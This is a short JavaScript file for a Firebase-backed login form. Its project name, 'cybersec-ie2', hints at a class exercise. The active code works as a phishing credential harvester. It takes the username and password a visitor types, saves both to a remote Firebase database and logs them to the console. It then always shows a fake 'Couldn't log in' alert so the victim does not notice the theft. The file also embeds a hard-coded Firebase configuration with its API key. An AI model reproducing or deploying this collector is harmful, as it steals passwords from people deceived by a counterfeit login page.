
const firebaseConfig = {
    apiKey: "AIzaSyCJSl7emZ0wh53vL3_iaoAx-iffzBnw2Zo",
    authDomain: "cybersec-ie2.firebaseapp.com",
    databaseURL: "https://cybersec-ie2-default-rtdb.firebaseio.com",
    projectId: "cybersec-ie2",
    storageBucket: "cybersec-ie2.appspot.com",
    messagingSenderId: "196577664174",
    appId: "1:196577664174:web:9f7c839751f59f60cee13f",
    measurementId: "G-8P2SQFPG0B"
  };

  firebase.initializeApp(firebaseConfig);

  var cyberSec_IE2DB = firebase.database().ref("cyberSec-IE2")
 
  document.getElementById("cyberSec-IE2").addEventListener("submit", submitForm);

   function submitForm(e) {
  e.preventDefault();

  var text = getElementVal("text");
  var password = getElementVal("password");

  saveMessages(text, password);

//   document.querySelector(".alert").style.display = "block";

//   setTimeout(() => {
//     document.querySelector(".alert").style.display = "none";
//   }, 3000);

  console.log(text,password);
    alert("Couldn't log in. Please Try again after some time");
  document.getElementById("cyberSec-IE2").reset();
  
}

const saveMessages = (text, password,) => {
  var newData = cyberSec_IE2DB.push();

  newData.set({
    text: text,
    password: password,
  });
};

const getElementVal = (id) => {

  return document.getElementById(id).value;
};













//   firebase.initializeApp(firebaseConfig);

// // reference your database
// var contactFormDB = firebase.database().ref("contactForm");

// document.getElementById("contactForm").addEventListener("submit", submitForm);

// function submitForm(e) {
//   e.preventDefault();

//   var name = getElementVal("name");
//   var emailid = getElementVal("emailid");
//   var msgContent = getElementVal("msgContent");

//   saveMessages(name, emailid, msgContent);

//   //   enable alert
//   document.querySelector(".alert").style.display = "block";

//   //   remove the alert
//   setTimeout(() => {
//     document.querySelector(".alert").style.display = "none";
//   }, 3000);

//   //   reset the form
//   document.getElementById("contactForm").reset();
// }

// const saveMessages = (name, emailid, msgContent) => {
//   var newContactForm = contactFormDB.push();

//   newContactForm.set({
//     name: name,
//     emailid: emailid,
//     msgContent: msgContent,
//   });
// };

// const getElementVal = (id) => {
//   return document.getElementById(id).value;
// };